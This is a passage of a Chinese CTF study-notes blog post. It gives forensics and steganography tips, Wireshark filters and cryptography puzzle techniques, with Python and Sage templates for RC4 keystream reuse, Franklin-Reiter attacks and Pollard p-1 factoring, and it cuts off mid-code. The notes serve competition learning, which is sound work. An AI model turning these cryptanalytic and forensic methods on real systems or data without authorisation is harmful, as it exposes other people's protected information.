class="toc-text">Ex. 拿到靶机的sh之后我们能干什么呢?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Remote"><span class="toc-number">7.</span> <span class="toc-text">Remote</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-number">7.1.</span> <span class="toc-text">1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF%E6%9D%BF%E5%AD%90"><span class="toc-number">8.</span> <span class="toc-text">CTF板子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#md5"><span class="toc-number">8.1.</span> <span class="toc-text">md5</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CTF
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Fluorine Wengers</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-09-04T15:21:27.000Z" class="dt-published" itemprop="datePublished">2024-09-04</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Algorithm/" rel="tag">Algorithm</a>, <a class="p-category" href="/tags/Game/" rel="tag">Game</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><h2 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/677780893">这个</a><br>地址 <code>/mnt/hgfs/LinuxShare</code></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h2><ol>
<li><code>&quot;aaa&quot;</code> 必须出现的词汇  </li>
<li><code>site:aaa.com</code> 只搜索这个网站的结果  </li>
<li><code>-aaa</code> 结果不出现某个词汇  </li>
<li><code>imagesize:500x500</code> 只搜索这么大的图片(像素)</li>
<li><code>filetype:pdf</code> 只搜索pdf格式的文档  </li>
<li><code>*</code> 通配符,不确定这个位置填啥可以写</li>
<li><code>aaa or bbb</code> <code>aaa and bbb</code> 返回包含两个词任何一个或者都包含的结果</li>
<li><code>BEFORE:1999</code> <code>AFTER:1999</code> <code>1999..2000</code> 查询指定年份的材料</li>
<li><code>related:aaa.com</code> 查询相关的网站</li>
<li><code>cache:aaa.com</code> 返回这个网站的缓存版本</li>
</ol>
<h2 id="Webs"><a href="#Webs" class="headerlink" title="Webs"></a>Webs</h2><p><strong>编码</strong>:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ruoli-s/p/14206145.html">CTF常见编码</a><br><a target="_blank" rel="noopener" href="http://www.hiencode.com/">CTF在线工具1</a><br><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tools">CTF在线工具2</a>  </p>
<p><strong>取证</strong>:<br>硬盘镜像取证⼯具 FTK Imager AutoPsy<br>内存镜像取证⼯具 Volatility<br>加密容器⼯具 Veracrypt<br>各⼤国内取证技术提供商的⼯具<br><a target="_blank" rel="noopener" href="https://forensics.xidian.edu.cn/">取证相关</a></p>
<p><strong>流量分析</strong>:<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9b9438dff7a2">OSI七层模型</a><br><a target="_blank" rel="noopener" href="https://blog.supersassw.com/p/ctf-note-misc_3/">流量分析入门</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mq0036/p/11187138.html">Wireshark使用</a></p>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>右键查看属性有时候能找到一串神秘字符串.</p>
<h2 id="rtf"><a href="#rtf" class="headerlink" title="rtf"></a>rtf</h2><p><code>7B 5C 72 74 66</code> 是 <code>&#123;\rtf</code> .</p>
<h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p><code>GIF8(47 49 36 38)</code> 是gif文件头,之后常接 <code>9a(39 61)</code> ,注意看提示.</p>
<p>powershell和cmd不是一个东西…<br>在cmd中拼合文件:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b a.bin + b.bin + c.bin res.bin</span><br></pre></td></tr></table></figure></p>
<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>binwalk可以自动检查文件里面杂糅什么文件.</p>
<p><code>binwalk -e a.xx</code> 则可以直接分离这些文件,根本不用自己查.</p>
<h2 id="ZIP伪加密"><a href="#ZIP伪加密" class="headerlink" title="ZIP伪加密"></a>ZIP伪加密</h2><p>ZIP文件格式有两种,其加密标志位分别在不同的位置:</p>
<p><code>50 4B 01 02 xx xx xx xx 01 08</code> :目录区加密,只需要管 <code>01</code> 改成偶数就行了, <code>08</code> 记录额外信息(不用管).<br><code>50 4B 03 04 xx xx 00 00</code> :局部文件加密标记,仍然是前半部分是偶数表示未加密.<br><code>78 9C AD 50</code> 是Zlib文件的开头编码.  </p>
<p>友情提示,zlib文件(gz)Win可以用cyberchef解压.<br>同时,部分linux自带binwalk.</p>
<h2 id="傅里叶盲水印"><a href="#傅里叶盲水印" class="headerlink" title="傅里叶盲水印"></a>傅里叶盲水印</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>抓包软件.</p>
<p><code>http contains &quot;POST&quot;</code> 搜索内容有 <code>POST</code> 的所有包.<br><code>http.request.method==POST</code> 也可以查找包<br><code>ip.addr==x.x.x.x</code> 查找IP是xxxx的包<br><code>tcp.port==80</code> 查找端口为80的包<br><code>http</code> 过滤所有http协议的包</p>
<p><code>analysis:Follow TCP stream</code> 是对数据流的分析然后整合成一个完整信息的过程.</p>
<p><code>ftp</code> 显示所有ftp协议的流.<br><code>ftp-data</code> 显示文件数据(对其追踪能够找到下载了什么)<br><strong>特别注意</strong> :追踪数据流的时候一定要选原始数据另存为,否则会存成hex格式导致打不开文件.</p>
<p><code>foremost</code> 在Kali上面有这个文件可以自动分离 <code>pcapng</code> 的文件.<br>抓包的时候可能碰到url编码和base64一起用的,如 <code>RDpcd2FtcDY0XHd3d1xhZG1pblw%3D</code> ,其中最后的 <code>%3D</code> 是 <code>=</code> .</p>
<p><code>tcp.stream eq 193</code> 后面的数字可以随意改变,意思是数据流编号(从0-无穷)<br>如果当前追踪流没有想要的结果,不妨换一个流再看(改数字)  </p>
<h2 id="图片宽高改变"><a href="#图片宽高改变" class="headerlink" title="图片宽高改变"></a>图片宽高改变</h2><p>使用脚本破解,原理是CRC校验.</p>
<p>然而实际上会有非常阴险的出题人连着图片的CRC一起改,导致直接改变宽高不会有任何提示.<br>这个时候推荐手动改变宽高然后丢进一个不管CRC的软件里查看图片,如 <strong>画图</strong> .<br>看起来一张图片宽度改错了整张图片都会崩,但是如果高度改变了,在画图中只会被表示为透明.</p>
<h2 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h2><p>因为这个包用的jdk11,而Flu电脑上装的是jdk17…</p>
<p><code>&amp; &quot;C:\Program Files\Java\jdk-11.0.2\bin\java.exe&quot; -classpath . Extract 文件绝对路径</code></p>
<h2 id="png补齐IDAT"><a href="#png补齐IDAT" class="headerlink" title="png补齐IDAT"></a>png补齐IDAT</h2><p>原理还是CRC校验,使用 <code>pngcheck.exe -v target.png</code> 自动检查计算CRC值是否正确.(Flu做的题里面是把IDAT改成IOAT然后再改图片高度让图片缺了一块,要靠自己补齐,,)</p>
<h2 id="文件夹带私货"><a href="#文件夹带私货" class="headerlink" title="文件夹带私货"></a>文件夹带私货</h2><p>出现文本 <code>xx,txt</code> , <code>PK</code> 值有可能是zip压缩包(zip的创始人名字简写为PK),改拓展名,如果有密码就暴力破解.</p>
<h2 id="LSB图像隐写"><a href="#LSB图像隐写" class="headerlink" title="LSB图像隐写"></a>LSB图像隐写</h2><p>因为很多颜色人是分辨不出来的,所以可以使用rgb颜色最低位进行隐写,隐藏信息或者加隐形水印.拉高对比度会显出原形.</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Webs-1"><a href="#Webs-1" class="headerlink" title="Webs"></a>Webs</h2><p><a target="_blank" rel="noopener" href="https://shal10w.github.io/">大佬博客1</a><br><a target="_blank" rel="noopener" href="https://d33b4t0.com/">大佬博客2</a>  </p>
<p><a target="_blank" rel="noopener" href="https://tool.bugku.com/jiemi/">解密网站</a></p>
<h2 id="数论基础"><a href="#数论基础" class="headerlink" title="数论基础"></a>数论基础</h2><h3 id="勒让德符号"><a href="#勒让德符号" class="headerlink" title="勒让德符号"></a>勒让德符号</h3><script type="math/tex; mode=display">\left(\frac ap\right)=a^{(p-1)/2}\mod p</script><p>意义:判断一个数字是不是模 $p$ 的二次剩余(是1不是p-1(模意义下的-1))0表示a是p的倍数.</p>
<h3 id="二次剩余的性质"><a href="#二次剩余的性质" class="headerlink" title="二次剩余的性质"></a>二次剩余的性质</h3><p><code>Quadratic Residue</code> 是二次剩余根, <code>Quadratic Non-residue</code> 表示非二次剩余数字.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Quadratic Residue * Quadratic Residue = Quadratic Residue</span><br><span class="line">Quadratic Residue * Quadratic Non-residue = Quadratic Non-residue</span><br><span class="line">Quadratic Non-residue * Quadratic Non-residue = Quadratic Residue</span><br></pre></td></tr></table></figure></p>
<h3 id="勒让德符号中质数的性质"><a href="#勒让德符号中质数的性质" class="headerlink" title="勒让德符号中质数的性质"></a>勒让德符号中质数的性质</h3><script type="math/tex; mode=display">\left(\frac{-1}p\right)=\begin{cases}
1&p\equiv1\mod4\\
-1&p\equiv3\mod4\end{cases}</script><script type="math/tex; mode=display">\left(\frac{2}p\right)=\begin{cases}
1&p\equiv\pm1\mod8\\
-1&p\equiv\pm3\mod8\end{cases}</script><p>这个符号是完全积性函数.</p>
<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><p>一个抑或加密体系,知道一个明文和相同密钥加密得到的密文可以还原另一条明文:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">msg = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">ct1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">ct2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 计算密钥流：keystream = msg XOR ct2</span></span><br><span class="line">keystream = <span class="built_in">bytes</span>([m ^ c <span class="keyword">for</span> m, c <span class="keyword">in</span> <span class="built_in">zip</span>(msg, ct2)])</span><br><span class="line"><span class="comment"># 使用密钥流的前37字节解密ct1得到flag</span></span><br><span class="line">flag = <span class="built_in">bytes</span>([c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(ct1, keystream)])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p>
<h2 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h2><p><a target="_blank" rel="noopener" href="https://hackliu.com/?p=245">密码总结1</a></p>
<p>旗语 中文注音符号 25对色码 维吉尼亚密码(凯撒密码+密钥) 棋盘密码 ASCII<br>仓颉码 五笔 四角号码 郑码 中日韩统一表意文字(和制汉字 韩制汉字,”国字”)<br>adfgx密码  </p>
<p>阴阳怪气编码 喵喵喵语(原理是零度等宽字符编码)</p>
<p><a target="_blank" rel="noopener" href="https://hanzi.unihan.com.cn/GanZhi/Index/">干支纪年法</a><br><a target="_blank" rel="noopener" href="http://code.mcdvisa.com/">中文电码</a><br><a target="_blank" rel="noopener" href="https://asecuritysite.com/cipher/code_sms">SMS Cipher</a>几个1-8之内的数字<br><a target="_blank" rel="noopener" href="https://quipqiup.com/">Q单词表爆破</a><br><a target="_blank" rel="noopener" href="http://web.chacuo.net/charsetuuencode">UUencode</a>,示例 <code>89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]</code><br><a target="_blank" rel="noopener" href="https://www.toolkk.com/tools/jjencode-encode-decode">JJencode</a><br><a target="_blank" rel="noopener" href="https://www.toolhelper.cn/EncodeDecode/QuotedPrintable">Quoted-Printable</a><br><a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_rabbit.html">Rabbit加密</a>(CyberChef上的这个巨难使,-1,别用)据说好像是U2开头<br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">Rot47加密</a>所有字母ascii都在33-126范围<br><a target="_blank" rel="noopener" href="https://www.metools.info/code/playfair_186.html">playfair加密</a>关键词”公平”<br><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">vigenere维吉尼亚密码</a><br><a target="_blank" rel="noopener" href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a><br><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a> 并没有链接,为什么这种编码算法还能爆炸的…<br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码 fence</a><br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒密码</a>  </p>
<p>碰到 <code>1745347988</code> 这种很大的而且以 <code>174</code> 开头的数字考虑时间.<br>碰到32位字母加数字联想md5,然后<a target="_blank" rel="noopener" href="https://cmd5.com">爆破</a>(.hash结尾的更说明了一切)<br>有的时候题目会非常意识流,记得先看这个数字是几进制的,然后用 <code>int(&#39;114514&#39;,5)</code> 恢复真正的十进制n.<br>然后当题目不给n的时候要猜测e不大.<br>碰到两个近乎完全相同的字符串要考虑表映射关系(python里面中文是一个字一个地址,好评)</p>
<h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><p>注意,ascii编码范围在0-127之间,碰到奇怪的进制可以尝试使用按照ascii值域分组整除密码.<br>看到一堆有超过127的可以考虑整体下移几个数字(rot操作)</p>
<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>出现 <code>ABC...Zabc...z+/=</code> 字符集字样联想base64.<br>代码段出现 <code>/3</code> <code>*4</code> 字样联想base64.</p>
<h2 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h2><p>xor是可逆的.<br>对于xor加密的字符串,可以尝试通过把 <code>flag&#123;</code> 这个前缀输进去反向解出密钥前几位,然后猜后几位(注意在cyberchef记得勾选UTF-8编码的密钥).</p>
<h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>尝试差值变换(第一个字符差1,第二个字符差2之类的…)</p>
<h2 id="RSA签名"><a href="#RSA签名" class="headerlink" title="RSA签名"></a>RSA签名</h2><p>信息使用你<strong>朋友的公钥</strong>加密,信息的哈希用<strong>自己的私钥</strong>加密,然后朋友用自己的私钥和你的公钥解密,得到哈希和原信息,然后比对一下,就叫做签名.</p>
<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>PS: <code>int(&quot;FFFF&quot;,16)</code> 能把字符串转成十六进制数字.  </p>
<blockquote>
<p><code>hex(d)</code> 一个数字转hex,返回0x啥一堆<br>有的时候给出的十六进制前面带前缀 <code>0x</code> 的同时后面会带后缀 <code>L</code> ,做题交flag不对了可以加上试试.  </p>
</blockquote>
<p>网上有很全的博客,这里讲一些例题</p>
<h3 id="0-enc-key"><a href="#0-enc-key" class="headerlink" title="0 .enc .key"></a>0 <code>.enc</code> <code>.key</code></h3><p>碰到这俩凑一对的去找<a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptrsakeyparse">rsa在线公私钥分解</a></p>
<h3 id="1-e-16"><a href="#1-e-16" class="headerlink" title="1 e=16"></a>1 e=16</h3><p>从rsa的角度,e和phi不互质,不存在d.<br>但是从二次剩余的角度,e=16意味着可以折半每次得到c^8,c^4,…逐次得到原始信息.</p>
<h3 id="2-pqrs-但是next-prime"><a href="#2-pqrs-但是next-prime" class="headerlink" title="2 pqrs,但是next_prime()"></a>2 pqrs,但是next_prime()</h3><p>题干很吓人:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alpha=<span class="number">8</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = gmpy2.next_prime(p*alpha)</span><br><span class="line">r = gmpy2.next_prime(q*alpha*<span class="number">2</span>)</span><br><span class="line">s = gmpy2.next_prime(r*alpha*<span class="number">4</span>)</span><br><span class="line">n = p**<span class="number">8</span> * q**(<span class="number">16</span>) * r**(<span class="number">32</span>) * s**<span class="number">2</span></span><br></pre></td></tr></table></figure><br>我们发现一个事实:对于一个任意的p,对应的qrs都是确定的.<br>所以直接值域二分,比较n大还是小就行了,复杂度O(logn).</p>
<h3 id="3-二项式模"><a href="#3-二项式模" class="headerlink" title="3 二项式模"></a>3 二项式模</h3><p>题干:给定</p>
<script type="math/tex; mode=display">N=pq</script><script type="math/tex; mode=display">c_1=(2p+3q)^{e_1}\mod N</script><script type="math/tex; mode=display">c_2=(5p+7q)^{e_2}\mod N</script><p>求 $p,q$ .</p>
<p>通过配平阶数可以得到如下式子:</p>
<script type="math/tex; mode=display">c_1^{e^2}=(2p+3q)^{e_1e_2}\mod N</script><script type="math/tex; mode=display">c_2^{e_1}=(5p+7q)^{e_1e_2}\mod N</script><p>因为 $N=pq$ ,所有含pq的都直接忽略:</p>
<script type="math/tex; mode=display">c_1^{e^2}=(2p)^{e_1e_2}+(3q)^{e_1e_2}\mod N</script><script type="math/tex; mode=display">c_2^{e_1}=(5p)^{e_1e_2}+(7q)^{e_1e_2}\mod N</script><p>解二元一次方程得到 $p^{e_1e_2}\mod N$ 和  $p^{e_1e_2}\mod N$ .<br>然后求 $\gcd(p^{e_1e_2},N)$ 得到 $p,q$ .</p>
<h3 id="4-不知道另一半"><a href="#4-不知道另一半" class="headerlink" title="4 不知道另一半"></a>4 不知道另一半</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = gmpy2.next_prime(p*q)</span><br><span class="line">n = p*q*r</span><br></pre></td></tr></table></figure>
<p>出于某种原因,你没有拿到n的另一半数字的phi,怎么解密?</p>
<p>这里就要引出RSA解密时一个比较重要的性质:对单个质因子即可解密.即RSA只让e对随便一个质数的phi取inv,然后d对这个质数p取模,也能还原出flag.</p>
<h3 id="5-给出-p-q-q-p"><a href="#5-给出-p-q-q-p" class="headerlink" title="5 给出 $p^q+q^p$"></a>5 给出 $p^q+q^p$</h3><p>设 $g=p^q+q^p$ ,有</p>
<script type="math/tex; mode=display">g\equiv p\mod q,g\equiv q\mod p</script><p>于是</p>
<script type="math/tex; mode=display">p|(g-q),q|(g-p)</script><script type="math/tex; mode=display">(g-p)(g-q)\equiv 0\mod n</script><script type="math/tex; mode=display">g\equiv p+q\mod n</script><p>所以就算出来了.</p>
<h3 id="6-已知-msg-2-a-msg-1-b-Franklin-Reiter-attack-相关消息攻击"><a href="#6-已知-msg-2-a-msg-1-b-Franklin-Reiter-attack-相关消息攻击" class="headerlink" title="6 已知 $msg_2=a*msg_1+b$ Franklin-Reiter attack 相关消息攻击"></a>6 已知 $msg_2=a*msg_1+b$ Franklin-Reiter attack 相关消息攻击</h3><p>据说要用多项式求gcd做.<br>得到的m是原信息.<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213821">相关链接</a><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,a,b,c1,c2</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (a*X + b)^e - c2</span><br><span class="line">    m_ = GCD(f1,f2).coefficients()[<span class="number">0</span>] <span class="comment"># 返回的是首一多项式，coefficients()返回多项式各项式的系数，项式次数递增，所以第0项是常数 </span></span><br><span class="line">    <span class="keyword">return</span> Integer(n - m_) <span class="comment"># 由于tmp其实是 -m % n,所以这里给他转换回去。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()        <span class="comment"># 返回首一多项式，即多项式最高次的项式系数为1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">b = </span><br><span class="line">a = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">m = franklinReiter(n,e,a,b,c1,c2)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure></p>
<h3 id="flag长度129位-n长度2048位-然后三份密文得到了-m-2"><a href="#flag长度129位-n长度2048位-然后三份密文得到了-m-2" class="headerlink" title="flag长度129位,n长度2048位,然后三份密文得到了 $m^2$"></a>flag长度129位,n长度2048位,然后三份密文得到了 $m^2$</h3><p>发现flag最大也不会大过几倍的n,所以查出来 $m^2$ 之后暴力试探 $m$ 的值.</p>
<h3 id="7-模意义思考"><a href="#7-模意义思考" class="headerlink" title="7 模意义思考"></a>7 模意义思考</h3><p>如果给了一堆奇怪的模意义下的东西,考虑分拆:</p>
<script type="math/tex; mode=display">a\equiv b\mod nm</script><p>则有</p>
<script type="math/tex; mode=display">a\equiv b\mod n</script><h2 id="8-给定-n-ppq-额外hint-invert-n-p-1-q-1"><a href="#8-给定-n-ppq-额外hint-invert-n-p-1-q-1" class="headerlink" title="8 给定 $n=ppq$ ,额外hint=invert(n,(p-1)*(q-1))"></a>8 给定 $n=p<em>p</em>q$ ,额外hint=invert(n,(p-1)*(q-1))</h2><p>这个题居然是用费马小定理做的…<br>首先给出了hint是逆元关系,我们有 $n*hint=1+k_1(p-1)(q-1)$  </p>
<blockquote>
<p>费马小定理:对于任意质数p和不能被p整除的整数a,有</p>
<script type="math/tex; mode=display">a^{p-1}\equiv 1\mod p</script></blockquote>
<p>则对于正整数a,我们有</p>
<script type="math/tex; mode=display">\begin{aligned}a^{n*hint}\equiv& a^{1+k_1(p-1)(q-1)}\\
\equiv& a^{(1+k_1(p-1)(q-1))\mod (p-1)}\mod p\\
\equiv& a\mod p
\end{aligned}</script><p>所以我们有 $a^{n<em>hint}-a\equiv 0\mod p$ ,即 $a^{n</em>hint}-a=k_2p$<br>算出来前者直接对n取gcd即可.</p>
<h3 id="Pollard’s-p-1-method"><a href="#Pollard’s-p-1-method" class="headerlink" title="Pollard’s p-1 method"></a>Pollard’s p-1 method</h3><p>这个是裸的板子,条件是p-1能被分解为很多小质数的积<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">PollardMethod</span>(<span class="params">N: <span class="built_in">int</span></span>):	<span class="comment"># 返回N的一个因子</span></span><br><span class="line">	a=<span class="number">2</span></span><br><span class="line">	<span class="keyword">for</span> n <span class="keyword">in</span> itertools.count(<span class="number">2</span>):</span><br><span class="line">		a=<span class="built_in">pow</span>(a,n,N)</span><br><span class="line">		g=gcd(a-<span class="number">1</span>,N)</span><br><span class="line">		<span class="keyword">if</span> g==<span class="number">1</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">elif</span> g==N:</span><br><span class="line">			a+=<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> g</span><br></pre></td></tr></table></figure><br>这个是魔改板子,条件是p-1还有一个很大的已知质数因子<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math,itertools</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollard_p1_with_factor</span>(<span class="params">N: <span class="built_in">int</span>,known_factor: <span class="built_in">int</span>,B: <span class="built_in">int</span> = <span class="number">100000</span></span>):</span><br><span class="line">	a=<span class="number">2</span></span><br><span class="line">	M=known_factor</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">primes_upto</span>(<span class="params">n</span>):</span><br><span class="line">		sieve=[<span class="literal">True</span>]*(n+<span class="number">1</span>)</span><br><span class="line">		sieve[<span class="number">0</span>:<span class="number">2</span>]=[<span class="literal">False</span>,<span class="literal">False</span>]</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(n**<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">			<span class="keyword">if</span> sieve[i]:</span><br><span class="line">				sieve[i*i:n+<span class="number">1</span>:i]=[<span class="literal">False</span>]*<span class="built_in">len</span>(<span class="built_in">range</span>(i*i,n+<span class="number">1</span>,i))</span><br><span class="line">		<span class="keyword">return</span> [p <span class="keyword">for</span> p,ok <span class="keyword">in</span> <span class="built_in">enumerate</span>(sieve) <span class="keyword">if</span> ok]</span><br><span class="line">	<span class="keyword">for</span> p <span class="keyword">in</span> primes_upto(B):</span><br><span class="line">		pk=p</span><br><span class="line">		<span class="keyword">while</span> pk*p&lt;=B:</span><br><span class="line">			pk*=p</span><br><span class="line">		M*=pk</span><br><span class="line">	aM=<span class="built_in">pow</span>(a,M,N)</span><br><span class="line">	g=math.gcd(aM-<span class="number">1</span>,N)</span><br><span class="line">	<span class="keyword">if</span> <span class="number">1</span>&lt;g&lt;N:</span><br><span class="line">		<span class="keyword">return</span> g</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">N = ...</span><br><span class="line">factor = ...</span><br><span class="line">p = pollard_p1_with_factor(N, factor)</span><br><span class="line"><span class="keyword">assert</span> N%p==<span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<h3 id="Williams’-p-1-method"><a href="#Williams’-p-1-method" class="headerlink" title="Williams’ p+1 method"></a>Williams’ p+1 method</h3><p>网上相关板子实在太少了,笔者这里补充一下.<br>这个是裸的板子,条件是p+1能被分解为很多小质数的积<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> 